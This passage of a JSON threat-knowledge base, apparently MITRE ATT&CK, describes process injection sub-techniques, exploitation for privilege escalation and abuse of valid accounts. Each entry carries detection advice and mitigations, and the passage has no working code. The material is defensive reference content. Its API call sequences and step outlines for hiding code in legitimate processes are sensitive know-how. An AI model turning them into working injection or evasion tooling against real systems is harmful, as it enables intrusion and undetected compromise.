system call injection can also be done with <code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>, which copy data to a specific address in the target processes’ memory (ex: the current address of the next instruction). <a href=\"http://man7.org/linux/man-pages/man2/ptrace.2.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PTRACE man)</a> <a href=\"https://medium.com/@jain.sm/code-injection-in-running-process-using-ptrace-d3ea7191a4be\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Medium Ptrace JUL 2018)</a> \n\nPtrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges. <a href=\"https://github.com/gaffe23/linux-inject/blob/master/slides_BHArsenal2015.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BH Linux Inject)</a> \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.","detection":"Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods. <em>The Art of Memory Forensics: Detecting Malware and Threats in Windows, Linux, and Mac Memory</em> (Ligh et al., Wiley, 2014) <a href=\"https://www.gnu.org/software/acct/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GNU Acct)</a> <a href=\"https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/chap-system_auditing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RHEL auditd)</a> <a href=\"http://www.chokepoint.net/2014/02/detecting-userland-preload-rootkits.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Chokepoint preload rootkits)</a> \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.","platforms":["Linux"],"dataSources":["Process: OS API Execution","Process: Process Access","Process: Process Modification"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Utilize Yama (ex: /proc/sys/kernel/yama/ptrace_scope) to mitigate ptrace based process injection by restricting the use of ptrace to privileged users only. Other mitigation controls involve the deployment of security kernel modules that provide advanced access control and process restrictions such as SELinux, grsecurity, and AppArmor."},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process."}]},{"id":"T1055.009","name":"Proc Memory","description":"Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. \n\nProc memory injection involves enumerating the memory of a process via the /proc filesystem (<code>/proc/[pid]</code>) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes’ memory map within <code>/proc/[pid]/maps</code> can be overwritten using dd. <a href=\"http://hick.org/code/skape/papers/needle.txt\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Uninformed Needle)</a> <a href=\"https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GDS Linux Injection)</a> <a href=\"http://man7.org/linux/man-pages/man1/dd.1.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DD Man)</a> \n\nOther techniques such as Dynamic Linker Hijacking may be used to populate a target process with more available gadgets. Similar to Process Hollowing, proc memory injection may target child processes (such as a backgrounded copy of sleep). <a href=\"https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GDS Linux Injection)</a> \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process.","detection":"File system monitoring can determine if /proc files are being modified. Users should not have permission to modify these in most cases. \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.","platforms":["Linux"],"dataSources":["File: File Modification"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict the permissions on sensitive files such as <code>/proc/[pid]/maps</code> or <code>/proc/[pid]/mem</code>."},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process."}]},{"id":"T1055.011","name":"Extra Window Memory Injection","description":"Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data). <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms633574.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Window Classes)</a> Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms633584.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft GetWindowLong function)</a> <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms633591.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SetWindowLong function)</a>\n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a> More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process. <a href=\"https://www.malwaretech.com/2013/08/powerloader-injection-something-truly.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MalwareTech Power Loader Aug 2013)</a> <a href=\"https://www.welivesecurity.com/2013/03/19/gapz-and-redyms-droppers-based-on-power-loader-code/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: WeLiveSecurity Gapz and Redyms Mar 2013)</a>\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.","detection":"Monitor for API calls related to enumerating and manipulating EWM such as GetWindowLong <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms633584.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft GetWindowLong function)</a> and SetWindowLong <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms633591.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SetWindowLong function)</a>. Malware associated with this technique have also used SendNotifyMessage <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms644953.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SendNotifyMessage function)</a> to trigger the associated window procedure and eventual malicious injection. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>","platforms":["Windows"],"dataSources":["Process: OS API Execution"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process."}]},{"id":"T1055.012","name":"Process Hollowing","description":"Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  \n\nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively. <a href=\"http://www.autosectools.com/process-hollowing.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Leitch Hollowing)</a> <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>\n\nThis is very similar to Thread Local Storage but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.","detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>\n\nProcessing hollowing commonly involves spawning an otherwise benign victim process. Consider correlating detections of processes created in a suspended state (ex: through API flags or process’ thread metadata) with other malicious activity such as attempts to modify a process' memory, especially by its parent process, or other abnormal process behavior. <a href=\"https://blog.nviso.eu/2020/02/04/the-return-of-the-spoof-part-2-command-line-spoofing/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Nviso Spoof Command Line 2020)</a> <a href=\"https://www.mandiant.com/resources/staying-hidden-on-the-endpoint-evading-detection-with-shellcode\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant Endpoint Evading 2019)</a>\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.","platforms":["Windows"],"dataSources":["Process: Process Creation","Process: Process Modification","Process: OS API Execution","Process: Process Access"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process."}]},{"id":"T1055.013","name":"Process Doppelgänging","description":"Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process. \n\nWindows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. <a href=\"https://msdn.microsoft.com/library/windows/desktop/bb968806.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft TxF)</a> To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. <a href=\"https://msdn.microsoft.com/library/windows/desktop/dd979526.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Basic TxF Concepts)</a> To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. <a href=\"https://msdn.microsoft.com/library/windows/desktop/aa365738.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Where to use TxF)</a>\n\nAlthough deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. <a href=\"https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BlackHat Process Doppelgänging Dec 2017)</a>\n\nAdversaries may abuse TxF to a perform a file-less variation of Process Injection. Similar to Process Hollowing, process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>, and <code>SetThreadContext</code>. <a href=\"https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BlackHat Process Doppelgänging Dec 2017)</a>\n\nProcess Doppelgänging is implemented in 4 steps <a href=\"https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BlackHat Process Doppelgänging Dec 2017)</a>:\n\n* Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.\n* Load – Create a shared section of memory and load the malicious executable.\n* Rollback – Undo changes to original executable, effectively removing malicious code from the file system.\n* Animate – Create a process from the tainted section of memory and initiate execution.\n\nThis behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelgänging may evade detection from security products since the execution is masked under a legitimate process.","detection":"Monitor and analyze calls to <code>CreateTransaction</code>, <code>CreateFileTransacted</code>, <code>RollbackTransaction</code>, and other rarely used functions indicative of TxF activity. Process Doppelgänging also invokes an outdated and undocumented implementation of the Windows process loader via calls to <code>NtCreateProcessEx</code> and <code>NtCreateThreadEx</code> as well as API calls used to modify memory within another process, such as <code>WriteProcessMemory</code>. <a href=\"https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BlackHat Process Doppelgänging Dec 2017)</a> <a href=\"https://hshrzd.wordpress.com/2017/12/18/process-doppelganging-a-new-way-to-impersonate-a-process/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: hasherezade Process Doppelgänging Dec 2017)</a>\n\nScan file objects reported during the PsSetCreateProcessNotifyRoutine, <a href=\"https://msdn.microsoft.com/library/windows/hardware/ff559951.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft PsSetCreateProcessNotifyRoutine routine)</a> which triggers a callback whenever a process is created or deleted, specifically looking for file objects with enabled write access. <a href=\"https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BlackHat Process Doppelgänging Dec 2017)</a> Also consider comparing file objects loaded in memory to the corresponding file on disk. <a href=\"https://hshrzd.wordpress.com/2017/12/18/process-doppelganging-a-new-way-to-impersonate-a-process/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: hasherezade Process Doppelgänging Dec 2017)</a>\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.","platforms":["Windows"],"dataSources":["File: File Metadata","Process: OS API Execution"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process."}]},{"id":"T1055.014","name":"VDSO Hijacking","description":"Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nVDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via Ptrace System Calls. However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions). <a href=\"https://web.archive.org/web/20150711051625/http://vxer.org/lib/vrn00.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ELF Injection May 2009)</a> <a href=\"https://backtrace.io/blog/backtrace/elf-shared-library-injection-forensics/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Backtrace VDSO)</a> <a href=\"https://web.archive.org/web/20051013084246/http://www.trilithium.com/johan/2005/08/linux-gate/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: VDSO Aug 2005)</a> <a href=\"https://lwn.net/Articles/604515/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Syscall 2014)</a>\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.","detection":"Monitor for malicious usage of system calls, such as ptrace and mmap, that can be used to attach to, manipulate memory, then redirect a processes' execution path. Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods. <em>The Art of Memory Forensics: Detecting Malware and Threats in Windows, Linux, and Mac Memory</em> (Ligh et al., Wiley, 2014) <a href=\"https://www.gnu.org/software/acct/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GNU Acct)</a> <a href=\"https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/chap-system_auditing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RHEL auditd)</a> <a href=\"http://www.chokepoint.net/2014/02/detecting-userland-preload-rootkits.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Chokepoint preload rootkits)</a> \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.","platforms":["Linux"],"dataSources":["Process: OS API Execution","Module: Module Load"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process."}]},{"id":"T1055.015","name":"ListPlanting","description":"Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process. <a href=\"https://www.hexacorn.com/blog/2019/04/25/listplanting-yet-another-code-injection-trick/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hexacorn Listplanting)</a> Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.\n\nList-view controls are user interface windows used to display collections of items. <a href=\"https://docs.microsoft.com/windows/win32/controls/list-view-controls-overview\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft List View Controls)</a> Information about an application's list-view settings are stored within the process' memory in a <code>SysListView32</code> control.\n\nListPlanting (a form of message-passing \"shatter attack\") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items. <a href=\"https://modexp.wordpress.com/2019/04/25/seven-window-injection-methods/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Modexp Windows Process Injection)</a> Adversaries must first copy code into the target process’ memory space, which can be performed various ways including by directly obtaining a handle to the <code>SysListView32</code> child of the victim process window (via Windows API calls such as <code>FindWindow</code> and/or <code>EnumWindows</code>) or other Process Injection methods.\n\nSome variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored <code>WriteProcessMemory</code> function. For example, an adversary can use the <code>PostMessage</code> and/or <code>SendMessage</code> API functions to send <code>LVM_SETITEMPOSITION</code> and <code>LVM_GETITEMPOSITION</code> messages, effectively copying a payload 2 bytes at a time to the allocated memory. <a href=\"https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_InvisiMole.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET InvisiMole June 2020)</a> \n\nFinally, the payload is triggered by sending the <code>LVM_SORTITEMS</code> message to the <code>SysListView32</code> child of the process window, with the payload within the newly allocated buffer passed and executed as the <code>ListView_SortItems</code> callback.","detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>FindWindow</code>, <code>FindWindowEx</code>, <code>EnumWindows</code>, <code>EnumChildWindows</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be abused for this technique. \n\nConsider monitoring for excessive use of <code>SendMessage</code> and/or <code>PostMessage</code> API functions with <code>LVM_SETITEMPOSITION</code> and/or <code>LVM_GETITEMPOSITION</code> arguments.\n\nAnalyze process behavior to determine if a process is performing unusual actions, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.","platforms":["Windows"],"dataSources":["Process: Process Modification","Process: OS API Execution"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process."}]}]},{"id":"T1068","name":"Exploitation for Privilege Escalation","description":"Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD). <a href=\"https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_InvisiMole.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET InvisiMole June 2020)</a> <a href=\"https://unit42.paloaltonetworks.com/acidbox-rare-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit42 AcidBox June 2020)</a> Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via Ingress Tool Transfer or Lateral Tool Transfer.","detection":"Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the processes. This could include suspicious files written to disk, evidence of Process Injection for attempts to hide execution or evidence of Discovery. Consider monitoring for the presence or loading (ex: Sysmon Event ID 6) of known vulnerable drivers that adversaries may drop and exploit to execute code in kernel mode. <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-driver-block-rules\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Driver Block Rules)</a>\n\nHigher privileges are often necessary to perform additional actions such as some methods of OS Credential Dumping. Look for additional activity that may indicate an adversary has gained higher privileges.","platforms":["Containers","Linux","macOS","Windows"],"dataSources":["Driver: Driver Load","Process: Process Creation"],"mitigations":[{"id":"M1019","name":"Threat Intelligence Program","description":"Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization."},{"id":"M1038","name":"Execution Prevention","description":"Consider blocking the execution of known vulnerable drivers that adversaries may exploit to execute code in kernel mode. Validate driver block rules in audit mode to ensure stability prior to production deployment. <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-driver-block-rules\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Driver Block Rules)</a>"},{"id":"M1048","name":"Application Isolation and Sandboxing","description":"Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing. Other types of virtualization and application microsegmentation may also mitigate the impact of some types of exploitation. Risks of additional exploits and weaknesses in these systems may still exist. <a href=\"https://arstechnica.com/information-technology/2017/03/hack-that-escapes-vm-by-exploiting-edge-browser-fetches-105000-at-pwn2own/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ars Technica Pwn2Own 2017 VM Escape)</a>"},{"id":"M1050","name":"Exploit Protection","description":"Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior. <a href=\"https://blogs.technet.microsoft.com/srd/2017/08/09/moving-beyond-emet-ii-windows-defender-exploit-guard/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Moving Beyond EMET)</a> Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring. <a href=\"https://en.wikipedia.org/wiki/Control-flow_integrity\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Control Flow Integrity)</a> Many of these protections depend on the architecture and target application binary for compatibility and may not work for software components targeted for privilege escalation."},{"id":"M1051","name":"Update Software","description":"Update software regularly by employing patch management for internal enterprise endpoints and servers."}],"subTechniques":[]},{"id":"T1078","name":"Valid Accounts","description":"Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop. <a href=\"https://www.volexity.com/blog/2022/06/15/driftingcloud-zero-day-sophos-firewall-exploitation-and-an-insidious-breach/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: volexity_0day_sophos_FW)</a> Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account. <a href=\"https://www.cisa.gov/uscert/ncas/alerts/aa22-074a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA MFA PrintNightmare)</a>\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a>","detection":"Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services. <a href=\"https://technet.microsoft.com/en-us/library/dn487457.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Audit Policy)</a> Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence. Checks on these accounts could also include whether default accounts such as Guest have been activated. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.","platforms":["Containers","ESXi","IaaS","Identity Provider","Linux","macOS","Network Devices","Office Suite","SaaS","Windows"],"dataSources":["Logon Session: Logon Session Creation","User Account: User Account Authentication","Logon Session: Logon Session Metadata"],"mitigations":[{"id":"M1013","name":"Application Developer Guidance","description":"Ensure that applications do not store sensitive data or credentials insecurely. (e.g. plaintext credentials in code, published credentials in repositories, or credentials in public cloud storage)."},{"id":"M1015","name":"Active Directory Configuration","description":"Disable legacy authentication, which does not support MFA, and require the use of modern authentication protocols instead."},{"id":"M1017","name":"User Training","description":"Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications."},{"id":"M1018","name":"User Account Management","description":"Regularly audit user accounts for activity and deactivate or remove any that are no longer needed."},{"id":"M1026","name":"Privileged Account Management","description":"Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn487450.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Least Privilege)</a> These audits should also include if default accounts have been enabled, or if new local accounts are created that have not been authorized. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. <a href=\"https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#a-nameesaebmaesae-administrative-forest-design-approach\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Securing Privileged Access)</a>"},{"id":"M1027","name":"Password Policies","description":"Applications and appliances that utilize default username and password should be changed immediately after the installation, and before deployment to a production environment. <a href=\"https://www.us-cert.gov/ncas/alerts/TA13-175A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT Alert TA13-175A Risks of Default Passwords on the Internet)</a> When possible, applications that use SSH keys should be updated periodically and properly secured.\n\nPolicies should 